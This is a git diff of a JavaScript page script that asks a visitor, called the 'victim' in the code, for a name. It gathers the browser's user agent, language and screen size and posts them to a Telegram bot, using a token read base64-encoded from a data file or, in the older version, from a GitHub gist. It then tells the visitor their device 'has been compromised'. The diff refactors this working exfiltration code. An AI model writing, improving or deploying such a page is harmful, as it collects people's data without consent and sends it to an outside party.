@@ -1,66 +1,110 @@
-function log_msg(message, title) {
-    document.getElementById("log").innerHTML += message + "\n";
+function showMsg(message, title) {
+    const logElement = document.getElementById("log");
+
+    logElement.textContent += `[+] ${message}\n`;
+    logElement.scrollTop = logElement.scrollHeight;
 
     if (title) {
-        document.getElementById("log-title").innerHTML = title;
+        document.getElementById("log-title").textContent = title;
     }
 }
 
-async function load_data(path) {
+
+async function fetchData(path) {
     try {
         const res = await fetch(path);
         const data = res.json();
         return data
     }catch (error) {
-        log_msg(error);
+        showMsg(error);
     }
 }
 
+
+async function sendTelegram(message) {
+    const data = await fetchData("./data.json");
+
+    const botToken = atob(data.TOKEN);
+    const chatID = data.CHAT_ID;
+    
+    if (!botToken || !chatID) {
+        showMsg("Error: Required data are missing...", "An error occured!");
+        return
+    }
+    
+    showMsg("Sending information...");
+
+    const apiURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+        const response = await fetch(apiURL, {
+            method: "POST",
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatID,
+                text: message,
+                parse_mode: "HTML"
+            })
+        });
+        
+        if (response.status == 200) {
+            showMsg("Information sent successfully!");
+            return 200
+        } else {
+            showMsg("Information wasn't sent!");
+            return 900
+        }
+    } catch (error) {
+        showMsg(error);
+    }
+}
+
+
 async function load() {
-    let victim_name = localStorage.getItem("victim_name");
-    if (!victim_name) {
-        victim_name =  prompt("Your Name (required): ");
-        if (!victim_name) {
-            alert("Name wasn't given, please try again!");
+    showMsg("Stage 1", "💭 Please wait...");
+    showMsg("Getting ready...\n");
+
+    // Getting victimName (Required)
+    let victimName = localStorage.getItem("victimName");
+    if (!victimName) {
+        victimName = prompt("Please type your name here 👇: 😝");
+        if (!victimName) {
+            alert("😕 Name wasn't given, please try again!");
             window.location.reload();
             return
         }
 
-        localStorage.setItem("victim_name", victim_name);
+        localStorage.setItem("victimName", victimName);
     }
 
-    log_msg("[+] Please wait...", "Please wait...");
-    log_msg("[+] Getting device info...");
-    log_msg("[+] Victim name: " + victim_name);
+    showMsg("Your name: " + victimName + "\n");
+    showMsg("Stage 2");
+    showMsg("Gathering information...\n");
 
-    let device_info = navigator.userAgent;
+    let message = `<b>Name:</b> <code>${victimName}</code>\n`;
+    const deviceInfo = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
 
-    log_msg("[+] Information: " + device_info);
-
-    const data = await load_data("https://gist.githubusercontent.com/bishalqx980/4a063168c8bfd6fd16a4b280d6e31728/raw/data.json");
-    bot_token = data.BOT_TOKENS.TheValorantLover;
-    chat_id = data.CHAT_ID;
-    
-    if (!bot_token || !chat_id) {
-        log_msg("Error: Required data are missing..", "Error occured!");
-        return
+        screenWidth: screen.width,
+        screenHeight: screen.height
     }
-    
-    log_msg("[+] Sending information...");
 
-    let message = `<b>${victim_name}:</b> <code>${device_info}</code>`;
+    for (const info in deviceInfo) {
+        message += `<b>${info}:</b> <code>${deviceInfo[info]}</code>\n`;
+        showMsg(`${info}: ${deviceInfo[info]}`);
+    }
 
-    let url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=HTML&text=${message}`;
+    showMsg("Variables set!\n");
+    showMsg("Stage 3");
+    showMsg("Sending information...\n");
 
-    let req = new XMLHttpRequest();
-    req.open("POST", url, true);
-    req.send();
-    req.onload = function() {
-        if (req.status == 200) {
-            log_msg("[+] Information successfully sent!", "Your device has been compromissed! :)");
-
-        }else {
-            log_msg("[-] Information wasn't sent! Error: " + req.responseText, "You got lucky buddy :(");
-        }
+    const response = await sendTelegram(message);
+    if (response == 200) {
+        showMsg("Your device has been compromised! 😝", "Your device has been compromised! 😝");
+    } else if (response == 900) {
+        showMsg("You got lucky buddy! You can try again... (reload the page)", "You got lucky buddy!");
     }
 }
